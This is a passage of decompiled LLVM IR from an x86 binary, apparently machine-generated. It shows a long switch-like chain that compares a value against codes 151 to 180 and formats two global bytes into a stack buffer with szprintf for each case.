dec_label_pc_804b734:                             ; preds = %dec_label_pc_804b72b
  %v0_804b734 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b734 = zext i8 %v0_804b734 to i32
  store i32 %v1_804b734, i32* @edx, align 4
  %v0_804b740 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b740 = zext i8 %v0_804b740 to i32
  %v2_804b74f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b74f, i32* @ebx, align 4
  %v5_804b756 = call i32 @szprintf(i32 %v2_804b74f, i32 ptrtoint ([14 x i8]* @global_var_8058ed5.174 to i32), i32 %v1_804b740, i32 %v1_804b734)
  br label %dec_label_pc_804b75e

dec_label_pc_804b75e:                             ; preds = %dec_label_pc_804b72b, %dec_label_pc_804b734
  %v12_804b75e = icmp eq i32 %v11_8049ac4, 151
  %v1_804b765 = icmp eq i1 %v12_804b75e, false
  br i1 %v1_804b765, label %dec_label_pc_804b791, label %dec_label_pc_804b767

dec_label_pc_804b767:                             ; preds = %dec_label_pc_804b75e
  %v0_804b767 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b767 = zext i8 %v0_804b767 to i32
  store i32 %v1_804b767, i32* @edx, align 4
  %v0_804b773 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b773 = zext i8 %v0_804b773 to i32
  %v2_804b782 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b782, i32* @ebx, align 4
  %v5_804b789 = call i32 @szprintf(i32 %v2_804b782, i32 ptrtoint ([14 x i8]* @global_var_8058ee3.175 to i32), i32 %v1_804b773, i32 %v1_804b767)
  br label %dec_label_pc_804b791

dec_label_pc_804b791:                             ; preds = %dec_label_pc_804b75e, %dec_label_pc_804b767
  %v12_804b791 = icmp eq i32 %v11_8049ac4, 152
  %v1_804b798 = icmp eq i1 %v12_804b791, false
  br i1 %v1_804b798, label %dec_label_pc_804b7c4, label %dec_label_pc_804b79a

dec_label_pc_804b79a:                             ; preds = %dec_label_pc_804b791
  %v0_804b79a = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b79a = zext i8 %v0_804b79a to i32
  store i32 %v1_804b79a, i32* @edx, align 4
  %v0_804b7a6 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b7a6 = zext i8 %v0_804b7a6 to i32
  %v2_804b7b5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7b5, i32* @ebx, align 4
  %v5_804b7bc = call i32 @szprintf(i32 %v2_804b7b5, i32 ptrtoint ([14 x i8]* @global_var_8058d14.141 to i32), i32 %v1_804b7a6, i32 %v1_804b79a)
  br label %dec_label_pc_804b7c4

dec_label_pc_804b7c4:                             ; preds = %dec_label_pc_804b791, %dec_label_pc_804b79a
  %v12_804b7c4 = icmp eq i32 %v11_8049ac4, 153
  %v1_804b7cb = icmp eq i1 %v12_804b7c4, false
  br i1 %v1_804b7cb, label %dec_label_pc_804b7f7, label %dec_label_pc_804b7cd

dec_label_pc_804b7cd:                             ; preds = %dec_label_pc_804b7c4
  %v0_804b7cd = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b7cd = zext i8 %v0_804b7cd to i32
  store i32 %v1_804b7cd, i32* @edx, align 4
  %v0_804b7d9 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b7d9 = zext i8 %v0_804b7d9 to i32
  %v2_804b7e8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7e8, i32* @ebx, align 4
  %v5_804b7ef = call i32 @szprintf(i32 %v2_804b7e8, i32 ptrtoint ([13 x i8]* @global_var_8058ef1.176 to i32), i32 %v1_804b7d9, i32 %v1_804b7cd)
  br label %dec_label_pc_804b7f7

dec_label_pc_804b7f7:                             ; preds = %dec_label_pc_804b7c4, %dec_label_pc_804b7cd
  %v12_804b7f7 = icmp eq i32 %v11_8049ac4, 154
  %v1_804b7fe = icmp eq i1 %v12_804b7f7, false
  br i1 %v1_804b7fe, label %dec_label_pc_804b82a, label %dec_label_pc_804b800

dec_label_pc_804b800:                             ; preds = %dec_label_pc_804b7f7
  %v0_804b800 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b800 = zext i8 %v0_804b800 to i32
  store i32 %v1_804b800, i32* @edx, align 4
  %v0_804b80c = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b80c = zext i8 %v0_804b80c to i32
  %v2_804b81b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b81b, i32* @ebx, align 4
  %v5_804b822 = call i32 @szprintf(i32 %v2_804b81b, i32 ptrtoint ([13 x i8]* @global_var_8058efe.177 to i32), i32 %v1_804b80c, i32 %v1_804b800)
  br label %dec_label_pc_804b82a

dec_label_pc_804b82a:                             ; preds = %dec_label_pc_804b7f7, %dec_label_pc_804b800
  %v12_804b82a = icmp eq i32 %v11_8049ac4, 155
  %v1_804b831 = icmp eq i1 %v12_804b82a, false
  br i1 %v1_804b831, label %dec_label_pc_804b85d, label %dec_label_pc_804b833

dec_label_pc_804b833:                             ; preds = %dec_label_pc_804b82a
  %v0_804b833 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b833 = zext i8 %v0_804b833 to i32
  store i32 %v1_804b833, i32* @edx, align 4
  %v0_804b83f = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b83f = zext i8 %v0_804b83f to i32
  %v2_804b84e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b84e, i32* @ebx, align 4
  %v5_804b855 = call i32 @szprintf(i32 %v2_804b84e, i32 ptrtoint ([13 x i8]* @global_var_8058f0b.178 to i32), i32 %v1_804b83f, i32 %v1_804b833)
  br label %dec_label_pc_804b85d

dec_label_pc_804b85d:                             ; preds = %dec_label_pc_804b82a, %dec_label_pc_804b833
  %v12_804b85d = icmp eq i32 %v11_8049ac4, 156
  %v1_804b864 = icmp eq i1 %v12_804b85d, false
  br i1 %v1_804b864, label %dec_label_pc_804b890, label %dec_label_pc_804b866

dec_label_pc_804b866:                             ; preds = %dec_label_pc_804b85d
  %v0_804b866 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b866 = zext i8 %v0_804b866 to i32
  store i32 %v1_804b866, i32* @edx, align 4
  %v0_804b872 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b872 = zext i8 %v0_804b872 to i32
  %v2_804b881 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b881, i32* @ebx, align 4
  %v5_804b888 = call i32 @szprintf(i32 %v2_804b881, i32 ptrtoint ([13 x i8]* @global_var_8058f18.179 to i32), i32 %v1_804b872, i32 %v1_804b866)
  br label %dec_label_pc_804b890

dec_label_pc_804b890:                             ; preds = %dec_label_pc_804b85d, %dec_label_pc_804b866
  %v12_804b890 = icmp eq i32 %v11_8049ac4, 157
  %v1_804b897 = icmp eq i1 %v12_804b890, false
  br i1 %v1_804b897, label %dec_label_pc_804b8c3, label %dec_label_pc_804b899

dec_label_pc_804b899:                             ; preds = %dec_label_pc_804b890
  %v0_804b899 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b899 = zext i8 %v0_804b899 to i32
  store i32 %v1_804b899, i32* @edx, align 4
  %v0_804b8a5 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b8a5 = zext i8 %v0_804b8a5 to i32
  %v2_804b8b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8b4, i32* @ebx, align 4
  %v5_804b8bb = call i32 @szprintf(i32 %v2_804b8b4, i32 ptrtoint ([13 x i8]* @global_var_8058f25.180 to i32), i32 %v1_804b8a5, i32 %v1_804b899)
  br label %dec_label_pc_804b8c3

dec_label_pc_804b8c3:                             ; preds = %dec_label_pc_804b890, %dec_label_pc_804b899
  %v12_804b8c3 = icmp eq i32 %v11_8049ac4, 158
  %v1_804b8ca = icmp eq i1 %v12_804b8c3, false
  br i1 %v1_804b8ca, label %dec_label_pc_804b8f6, label %dec_label_pc_804b8cc

dec_label_pc_804b8cc:                             ; preds = %dec_label_pc_804b8c3
  %v0_804b8cc = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b8cc = zext i8 %v0_804b8cc to i32
  store i32 %v1_804b8cc, i32* @edx, align 4
  %v0_804b8d8 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b8d8 = zext i8 %v0_804b8d8 to i32
  %v2_804b8e7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8e7, i32* @ebx, align 4
  %v5_804b8ee = call i32 @szprintf(i32 %v2_804b8e7, i32 ptrtoint ([12 x i8]* @global_var_8058f32.181 to i32), i32 %v1_804b8d8, i32 %v1_804b8cc)
  br label %dec_label_pc_804b8f6

dec_label_pc_804b8f6:                             ; preds = %dec_label_pc_804b8c3, %dec_label_pc_804b8cc
  %v12_804b8f6 = icmp eq i32 %v11_8049ac4, 159
  %v1_804b8fd = icmp eq i1 %v12_804b8f6, false
  br i1 %v1_804b8fd, label %dec_label_pc_804b929, label %dec_label_pc_804b8ff

dec_label_pc_804b8ff:                             ; preds = %dec_label_pc_804b8f6
  %v0_804b8ff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b8ff = zext i8 %v0_804b8ff to i32
  store i32 %v1_804b8ff, i32* @edx, align 4
  %v0_804b90b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b90b = zext i8 %v0_804b90b to i32
  %v2_804b91a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b91a, i32* @ebx, align 4
  %v5_804b921 = call i32 @szprintf(i32 %v2_804b91a, i32 ptrtoint ([14 x i8]* @global_var_8058f3e.182 to i32), i32 %v1_804b90b, i32 %v1_804b8ff)
  br label %dec_label_pc_804b929

dec_label_pc_804b929:                             ; preds = %dec_label_pc_804b8f6, %dec_label_pc_804b8ff
  %v9_804b929 = icmp eq i32 %v11_8049ac4, 160
  %v1_804b930 = icmp eq i1 %v9_804b929, false
  br i1 %v1_804b930, label %dec_label_pc_804b95c, label %dec_label_pc_804b932

dec_label_pc_804b932:                             ; preds = %dec_label_pc_804b929
  %v0_804b932 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b932 = zext i8 %v0_804b932 to i32
  store i32 %v1_804b932, i32* @edx, align 4
  %v0_804b93e = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b93e = zext i8 %v0_804b93e to i32
  %v2_804b94d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b94d, i32* @ebx, align 4
  %v5_804b954 = call i32 @szprintf(i32 %v2_804b94d, i32 ptrtoint ([13 x i8]* @global_var_8058f4c.183 to i32), i32 %v1_804b93e, i32 %v1_804b932)
  br label %dec_label_pc_804b95c

dec_label_pc_804b95c:                             ; preds = %dec_label_pc_804b929, %dec_label_pc_804b932
  %v12_804b95c = icmp eq i32 %v11_8049ac4, 161
  %v1_804b963 = icmp eq i1 %v12_804b95c, false
  br i1 %v1_804b963, label %dec_label_pc_804b98f, label %dec_label_pc_804b965

dec_label_pc_804b965:                             ; preds = %dec_label_pc_804b95c
  %v0_804b965 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b965 = zext i8 %v0_804b965 to i32
  store i32 %v1_804b965, i32* @edx, align 4
  %v0_804b971 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b971 = zext i8 %v0_804b971 to i32
  %v2_804b980 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b980, i32* @ebx, align 4
  %v5_804b987 = call i32 @szprintf(i32 %v2_804b980, i32 ptrtoint ([14 x i8]* @global_var_8058f59.184 to i32), i32 %v1_804b971, i32 %v1_804b965)
  br label %dec_label_pc_804b98f

dec_label_pc_804b98f:                             ; preds = %dec_label_pc_804b95c, %dec_label_pc_804b965
  %v12_804b98f = icmp eq i32 %v11_8049ac4, 162
  %v1_804b996 = icmp eq i1 %v12_804b98f, false
  br i1 %v1_804b996, label %dec_label_pc_804b9c2, label %dec_label_pc_804b998

dec_label_pc_804b998:                             ; preds = %dec_label_pc_804b98f
  %v0_804b998 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b998 = zext i8 %v0_804b998 to i32
  store i32 %v1_804b998, i32* @edx, align 4
  %v0_804b9a4 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b9a4 = zext i8 %v0_804b9a4 to i32
  %v2_804b9b3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9b3, i32* @ebx, align 4
  %v5_804b9ba = call i32 @szprintf(i32 %v2_804b9b3, i32 ptrtoint ([14 x i8]* @global_var_8058f67.185 to i32), i32 %v1_804b9a4, i32 %v1_804b998)
  br label %dec_label_pc_804b9c2

dec_label_pc_804b9c2:                             ; preds = %dec_label_pc_804b98f, %dec_label_pc_804b998
  %v12_804b9c2 = icmp eq i32 %v11_8049ac4, 163
  %v1_804b9c9 = icmp eq i1 %v12_804b9c2, false
  br i1 %v1_804b9c9, label %dec_label_pc_804b9f5, label %dec_label_pc_804b9cb

dec_label_pc_804b9cb:                             ; preds = %dec_label_pc_804b9c2
  %v0_804b9cb = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b9cb = zext i8 %v0_804b9cb to i32
  store i32 %v1_804b9cb, i32* @edx, align 4
  %v0_804b9d7 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804b9d7 = zext i8 %v0_804b9d7 to i32
  %v2_804b9e6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9e6, i32* @ebx, align 4
  %v5_804b9ed = call i32 @szprintf(i32 %v2_804b9e6, i32 ptrtoint ([14 x i8]* @global_var_8058f75.186 to i32), i32 %v1_804b9d7, i32 %v1_804b9cb)
  br label %dec_label_pc_804b9f5

dec_label_pc_804b9f5:                             ; preds = %dec_label_pc_804b9c2, %dec_label_pc_804b9cb
  %v12_804b9f5 = icmp eq i32 %v11_8049ac4, 164
  %v1_804b9fc = icmp eq i1 %v12_804b9f5, false
  br i1 %v1_804b9fc, label %dec_label_pc_804ba28, label %dec_label_pc_804b9fe

dec_label_pc_804b9fe:                             ; preds = %dec_label_pc_804b9f5
  %v0_804b9fe = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804b9fe = zext i8 %v0_804b9fe to i32
  store i32 %v1_804b9fe, i32* @edx, align 4
  %v0_804ba0a = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ba0a = zext i8 %v0_804ba0a to i32
  %v2_804ba19 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba19, i32* @ebx, align 4
  %v5_804ba20 = call i32 @szprintf(i32 %v2_804ba19, i32 ptrtoint ([14 x i8]* @global_var_8058ee3.175 to i32), i32 %v1_804ba0a, i32 %v1_804b9fe)
  br label %dec_label_pc_804ba28

dec_label_pc_804ba28:                             ; preds = %dec_label_pc_804b9f5, %dec_label_pc_804b9fe
  %v12_804ba28 = icmp eq i32 %v11_8049ac4, 165
  %v1_804ba2f = icmp eq i1 %v12_804ba28, false
  br i1 %v1_804ba2f, label %dec_label_pc_804ba5b, label %dec_label_pc_804ba31

dec_label_pc_804ba31:                             ; preds = %dec_label_pc_804ba28
  %v0_804ba31 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ba31 = zext i8 %v0_804ba31 to i32
  store i32 %v1_804ba31, i32* @edx, align 4
  %v0_804ba3d = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ba3d = zext i8 %v0_804ba3d to i32
  %v2_804ba4c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba4c, i32* @ebx, align 4
  %v5_804ba53 = call i32 @szprintf(i32 %v2_804ba4c, i32 ptrtoint ([13 x i8]* @global_var_8058f83.187 to i32), i32 %v1_804ba3d, i32 %v1_804ba31)
  br label %dec_label_pc_804ba5b

dec_label_pc_804ba5b:                             ; preds = %dec_label_pc_804ba28, %dec_label_pc_804ba31
  %v12_804ba5b = icmp eq i32 %v11_8049ac4, 166
  %v1_804ba62 = icmp eq i1 %v12_804ba5b, false
  br i1 %v1_804ba62, label %dec_label_pc_804ba8e, label %dec_label_pc_804ba64

dec_label_pc_804ba64:                             ; preds = %dec_label_pc_804ba5b
  %v0_804ba64 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ba64 = zext i8 %v0_804ba64 to i32
  store i32 %v1_804ba64, i32* @edx, align 4
  %v0_804ba70 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ba70 = zext i8 %v0_804ba70 to i32
  %v2_804ba7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba7f, i32* @ebx, align 4
  %v5_804ba86 = call i32 @szprintf(i32 %v2_804ba7f, i32 ptrtoint ([14 x i8]* @global_var_8058f90.188 to i32), i32 %v1_804ba70, i32 %v1_804ba64)
  br label %dec_label_pc_804ba8e

dec_label_pc_804ba8e:                             ; preds = %dec_label_pc_804ba5b, %dec_label_pc_804ba64
  %v12_804ba8e = icmp eq i32 %v11_8049ac4, 167
  %v1_804ba95 = icmp eq i1 %v12_804ba8e, false
  br i1 %v1_804ba95, label %dec_label_pc_804bac1, label %dec_label_pc_804ba97

dec_label_pc_804ba97:                             ; preds = %dec_label_pc_804ba8e
  %v0_804ba97 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ba97 = zext i8 %v0_804ba97 to i32
  store i32 %v1_804ba97, i32* @edx, align 4
  %v0_804baa3 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804baa3 = zext i8 %v0_804baa3 to i32
  %v2_804bab2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bab2, i32* @ebx, align 4
  %v5_804bab9 = call i32 @szprintf(i32 %v2_804bab2, i32 ptrtoint ([14 x i8]* @global_var_8058f3e.182 to i32), i32 %v1_804baa3, i32 %v1_804ba97)
  br label %dec_label_pc_804bac1

dec_label_pc_804bac1:                             ; preds = %dec_label_pc_804ba8e, %dec_label_pc_804ba97
  %v12_804bac1 = icmp eq i32 %v11_8049ac4, 168
  %v1_804bac8 = icmp eq i1 %v12_804bac1, false
  br i1 %v1_804bac8, label %dec_label_pc_804baf4, label %dec_label_pc_804baca

dec_label_pc_804baca:                             ; preds = %dec_label_pc_804bac1
  %v0_804baca = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804baca = zext i8 %v0_804baca to i32
  store i32 %v1_804baca, i32* @edx, align 4
  %v0_804bad6 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bad6 = zext i8 %v0_804bad6 to i32
  %v2_804bae5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bae5, i32* @ebx, align 4
  %v5_804baec = call i32 @szprintf(i32 %v2_804bae5, i32 ptrtoint ([14 x i8]* @global_var_8058f9e.189 to i32), i32 %v1_804bad6, i32 %v1_804baca)
  br label %dec_label_pc_804baf4

dec_label_pc_804baf4:                             ; preds = %dec_label_pc_804bac1, %dec_label_pc_804baca
  %v12_804baf4 = icmp eq i32 %v11_8049ac4, 169
  %v1_804bafb = icmp eq i1 %v12_804baf4, false
  br i1 %v1_804bafb, label %dec_label_pc_804bb27, label %dec_label_pc_804bafd

dec_label_pc_804bafd:                             ; preds = %dec_label_pc_804baf4
  %v0_804bafd = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bafd = zext i8 %v0_804bafd to i32
  store i32 %v1_804bafd, i32* @edx, align 4
  %v0_804bb09 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bb09 = zext i8 %v0_804bb09 to i32
  %v2_804bb18 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb18, i32* @ebx, align 4
  %v5_804bb1f = call i32 @szprintf(i32 %v2_804bb18, i32 ptrtoint ([14 x i8]* @global_var_8058fac.190 to i32), i32 %v1_804bb09, i32 %v1_804bafd)
  br label %dec_label_pc_804bb27

dec_label_pc_804bb27:                             ; preds = %dec_label_pc_804baf4, %dec_label_pc_804bafd
  %v12_804bb27 = icmp eq i32 %v11_8049ac4, 171
  %v1_804bb2e = icmp eq i1 %v12_804bb27, false
  br i1 %v1_804bb2e, label %dec_label_pc_804bb5a, label %dec_label_pc_804bb30

dec_label_pc_804bb30:                             ; preds = %dec_label_pc_804bb27
  %v0_804bb30 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bb30 = zext i8 %v0_804bb30 to i32
  store i32 %v1_804bb30, i32* @edx, align 4
  %v0_804bb3c = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bb3c = zext i8 %v0_804bb3c to i32
  %v2_804bb4b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb4b, i32* @ebx, align 4
  %v5_804bb52 = call i32 @szprintf(i32 %v2_804bb4b, i32 ptrtoint ([14 x i8]* @global_var_8058fba.191 to i32), i32 %v1_804bb3c, i32 %v1_804bb30)
  br label %dec_label_pc_804bb5a

dec_label_pc_804bb5a:                             ; preds = %dec_label_pc_804bb27, %dec_label_pc_804bb30
  %v12_804bb5a = icmp eq i32 %v11_8049ac4, 172
  %v1_804bb61 = icmp eq i1 %v12_804bb5a, false
  br i1 %v1_804bb61, label %dec_label_pc_804bb8d, label %dec_label_pc_804bb63

dec_label_pc_804bb63:                             ; preds = %dec_label_pc_804bb5a
  %v0_804bb63 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bb63 = zext i8 %v0_804bb63 to i32
  store i32 %v1_804bb63, i32* @edx, align 4
  %v0_804bb6f = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bb6f = zext i8 %v0_804bb6f to i32
  %v2_804bb7e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb7e, i32* @ebx, align 4
  %v5_804bb85 = call i32 @szprintf(i32 %v2_804bb7e, i32 ptrtoint ([14 x i8]* @global_var_8058fc8.192 to i32), i32 %v1_804bb6f, i32 %v1_804bb63)
  br label %dec_label_pc_804bb8d

dec_label_pc_804bb8d:                             ; preds = %dec_label_pc_804bb5a, %dec_label_pc_804bb63
  %v12_804bb8d = icmp eq i32 %v11_8049ac4, 173
  %v1_804bb94 = icmp eq i1 %v12_804bb8d, false
  br i1 %v1_804bb94, label %dec_label_pc_804bbc0, label %dec_label_pc_804bb96

dec_label_pc_804bb96:                             ; preds = %dec_label_pc_804bb8d
  %v0_804bb96 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bb96 = zext i8 %v0_804bb96 to i32
  store i32 %v1_804bb96, i32* @edx, align 4
  %v0_804bba2 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bba2 = zext i8 %v0_804bba2 to i32
  %v2_804bbb1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbb1, i32* @ebx, align 4
  %v5_804bbb8 = call i32 @szprintf(i32 %v2_804bbb1, i32 ptrtoint ([14 x i8]* @global_var_8058fd6.193 to i32), i32 %v1_804bba2, i32 %v1_804bb96)
  br label %dec_label_pc_804bbc0

dec_label_pc_804bbc0:                             ; preds = %dec_label_pc_804bb8d, %dec_label_pc_804bb96
  %v12_804bbc0 = icmp eq i32 %v11_8049ac4, 174
  %v1_804bbc7 = icmp eq i1 %v12_804bbc0, false
  br i1 %v1_804bbc7, label %dec_label_pc_804bbf3, label %dec_label_pc_804bbc9

dec_label_pc_804bbc9:                             ; preds = %dec_label_pc_804bbc0
  %v0_804bbc9 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bbc9 = zext i8 %v0_804bbc9 to i32
  store i32 %v1_804bbc9, i32* @edx, align 4
  %v0_804bbd5 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bbd5 = zext i8 %v0_804bbd5 to i32
  %v2_804bbe4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbe4, i32* @ebx, align 4
  %v5_804bbeb = call i32 @szprintf(i32 %v2_804bbe4, i32 ptrtoint ([13 x i8]* @global_var_8058fe4.194 to i32), i32 %v1_804bbd5, i32 %v1_804bbc9)
  br label %dec_label_pc_804bbf3

dec_label_pc_804bbf3:                             ; preds = %dec_label_pc_804bbc0, %dec_label_pc_804bbc9
  %v12_804bbf3 = icmp eq i32 %v11_8049ac4, 175
  %v1_804bbfa = icmp eq i1 %v12_804bbf3, false
  br i1 %v1_804bbfa, label %dec_label_pc_804bc26, label %dec_label_pc_804bbfc

dec_label_pc_804bbfc:                             ; preds = %dec_label_pc_804bbf3
  %v0_804bbfc = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bbfc = zext i8 %v0_804bbfc to i32
  store i32 %v1_804bbfc, i32* @edx, align 4
  %v0_804bc08 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bc08 = zext i8 %v0_804bc08 to i32
  %v2_804bc17 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc17, i32* @ebx, align 4
  %v5_804bc1e = call i32 @szprintf(i32 %v2_804bc17, i32 ptrtoint ([14 x i8]* @global_var_8058ff1.195 to i32), i32 %v1_804bc08, i32 %v1_804bbfc)
  br label %dec_label_pc_804bc26

dec_label_pc_804bc26:                             ; preds = %dec_label_pc_804bbf3, %dec_label_pc_804bbfc
  %v9_804bc26 = icmp eq i32 %v11_8049ac4, 176
  %v1_804bc2d = icmp eq i1 %v9_804bc26, false
  br i1 %v1_804bc2d, label %dec_label_pc_804bc59, label %dec_label_pc_804bc2f

dec_label_pc_804bc2f:                             ; preds = %dec_label_pc_804bc26
  %v0_804bc2f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bc2f = zext i8 %v0_804bc2f to i32
  store i32 %v1_804bc2f, i32* @edx, align 4
  %v0_804bc3b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bc3b = zext i8 %v0_804bc3b to i32
  %v2_804bc4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc4a, i32* @ebx, align 4
  %v5_804bc51 = call i32 @szprintf(i32 %v2_804bc4a, i32 ptrtoint ([14 x i8]* @global_var_8058fff.196 to i32), i32 %v1_804bc3b, i32 %v1_804bc2f)
  br label %dec_label_pc_804bc59

dec_label_pc_804bc59:                             ; preds = %dec_label_pc_804bc26, %dec_label_pc_804bc2f
  %v12_804bc59 = icmp eq i32 %v11_8049ac4, 177
  %v1_804bc60 = icmp eq i1 %v12_804bc59, false
  br i1 %v1_804bc60, label %dec_label_pc_804bc8c, label %dec_label_pc_804bc62

dec_label_pc_804bc62:                             ; preds = %dec_label_pc_804bc59
  %v0_804bc62 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bc62 = zext i8 %v0_804bc62 to i32
  store i32 %v1_804bc62, i32* @edx, align 4
  %v0_804bc6e = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bc6e = zext i8 %v0_804bc6e to i32
  %v2_804bc7d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc7d, i32* @ebx, align 4
  %v5_804bc84 = call i32 @szprintf(i32 %v2_804bc7d, i32 ptrtoint ([14 x i8]* @global_var_805900d.197 to i32), i32 %v1_804bc6e, i32 %v1_804bc62)
  br label %dec_label_pc_804bc8c

dec_label_pc_804bc8c:                             ; preds = %dec_label_pc_804bc59, %dec_label_pc_804bc62
  %v12_804bc8c = icmp eq i32 %v11_8049ac4, 178
  %v1_804bc93 = icmp eq i1 %v12_804bc8c, false
  br i1 %v1_804bc93, label %dec_label_pc_804bcbf, label %dec_label_pc_804bc95

dec_label_pc_804bc95:                             ; preds = %dec_label_pc_804bc8c
  %v0_804bc95 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bc95 = zext i8 %v0_804bc95 to i32
  store i32 %v1_804bc95, i32* @edx, align 4
  %v0_804bca1 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bca1 = zext i8 %v0_804bca1 to i32
  %v2_804bcb0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcb0, i32* @ebx, align 4
  %v5_804bcb7 = call i32 @szprintf(i32 %v2_804bcb0, i32 ptrtoint ([13 x i8]* @global_var_805901b.198 to i32), i32 %v1_804bca1, i32 %v1_804bc95)
  br label %dec_label_pc_804bcbf

dec_label_pc_804bcbf:                             ; preds = %dec_label_pc_804bc8c, %dec_label_pc_804bc95
  %v12_804bcbf = icmp eq i32 %v11_8049ac4, 179
  %v1_804bcc6 = icmp eq i1 %v12_804bcbf, false
  br i1 %v1_804bcc6, label %dec_label_pc_804bcf2, label %dec_label_pc_804bcc8

dec_label_pc_804bcc8:                             ; preds = %dec_label_pc_804bcbf
  %v0_804bcc8 = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bcc8 = zext i8 %v0_804bcc8 to i32
  store i32 %v1_804bcc8, i32* @edx, align 4
  %v0_804bcd4 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bcd4 = zext i8 %v0_804bcd4 to i32
  %v2_804bce3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bce3, i32* @ebx, align 4
  %v5_804bcea = call i32 @szprintf(i32 %v2_804bce3, i32 ptrtoint ([13 x i8]* @global_var_8059028.199 to i32), i32 %v1_804bcd4, i32 %v1_804bcc8)
  br label %dec_label_pc_804bcf2

dec_label_pc_804bcf2:                             ; preds = %dec_label_pc_804bcbf, %dec_label_pc_804bcc8
  %v12_804bcf2 = icmp eq i32 %v11_8049ac4, 180
  %v1_804bcf9 = icmp eq i1 %v12_804bcf2, false
  br i1 %v1_804bcf9, label %dec_label_pc_804bd25, label %dec_label_pc_804bcfb

dec_label_pc_804bcfb:                             ; preds = %dec_label_pc_804bcf2
  %v0_804bcfb = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804bcfb = zext i8 %v0_804bcfb to i32
  store i32 %v1_804bcfb, i32* @edx, align 4
  %v0_804bd07 = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804bd07 = zext i8 %v0_804bd07 to i32
